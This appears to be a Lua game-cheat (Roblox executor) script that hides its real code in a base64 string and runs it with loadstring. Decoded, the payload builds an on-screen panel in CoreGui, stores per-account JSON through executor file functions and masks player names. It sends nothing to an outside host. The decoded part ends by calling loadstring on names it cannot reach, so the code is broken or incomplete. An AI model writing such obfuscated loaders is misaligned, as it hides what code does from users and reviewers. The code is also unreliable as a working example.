local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do
			r = r .. (f%2^i-f%2^(i-1)>0 and '1' or '0')
		end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do
			c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
		end
		return string.char(c)
	end))
end

local a = "bG9jYWwgSHR0cCA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgU3RhdHMgPSBnYW1lOkdldFNlcnZpY2UoIlN0YXRzIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCgpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgotLSBGSVggVFLDmU5HIFVJCnBjYWxsKGZ1bmN0aW9uKCkKCWxvY2FsIG9sZCA9IGdhbWUuQ29yZUd1aTpGaW5kRmlyc3RDaGlsZCgiVFRBTV9HVUkiKQoJaWYgb2xkIHRoZW4gb2xkOkRlc3Ryb3koKSBlbmQKZW5kKQoKLS0gRklMRSBUSEVPIEFDQwpsb2NhbCBmaWxlID0gInR0YW1fIiAuLiBwbGF5ZXIuVXNlcklkIC4uICIuanNvbiIKCi0tIExPQUQKbG9jYWwgZGF0YSA9IHsgRG9uID0gIkNoxrBhIG5o4bqtcCIgfQppZiBpc2ZpbGUgYW5kIGlzZmlsZShmaWxlKSB0aGVuCglsb2NhbCBvaywgZGVjb2RlZCA9IHBjYWxsKGZ1bmN0aW9uKCkKCQlyZXR1cm4gSHR0cDpKU09ORGVjb2RlKHJlYWRmaWxlKGZpbGUpKQoJZW5kKQoJaWYgb2sgdGhlbiBkYXRhID0gZGVjb2RlZCBlbmQKZW5kCgotLSBTQVZFCmxvY2FsIGZ1bmN0aW9uIHNhdmUoKQoJaWYgd3JpdGVmaWxlIHRoZW4KCQl3cml0ZWZpbGUoZmlsZSwgSHR0cDpKU09ORW5jb2RlKGRhdGEpKQoJZW5kCmVuZAoKLS0g4bqoTiBUw4pOCmxvY2FsIGZ1bmN0aW9uIGhpZGVOYW1lKG5hbWUpCglpZiBub3QgbmFtZSB0aGVuIHJldHVybiAiIiBlbmQKCWlmICNuYW1lID4gNiB0aGVuCgkJcmV0dXJuIHN0cmluZy5zdWIobmFtZSwxLDYpLi4iKioqIgoJZWxzZQoJCXJldHVybiBzdHJpbmcuc3ViKG5hbWUsMSwzKS4uIioqKiIKCWVuZAplbmQKCi0tIEdVSQpsb2NhbCBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIsIGdhbWUuQ29yZUd1aSkKZ3VpLk5hbWUgPSAiVFRBTV9HVUkiCgotLSBGUkFNRQpsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBndWkpCmZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwyNjAsMCwxMzUpCmZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwtMTMwLDAuMTgsMCkKZnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1LDE1LDE1KQpmcmFtZS5BY3RpdmUgPSB0cnVlCmZyYW1lLkRyYWdnYWJsZSA9IHRydWUKSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGZyYW1lKQoKbG9jYWwgc3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIGZyYW1lKQpzdHJva2UuVGhpY2tuZXNzID0gMgoKbG9hZHN0cmluZyhkZWNvZGUoYSkpKCk="

loadstring(decode(a))()
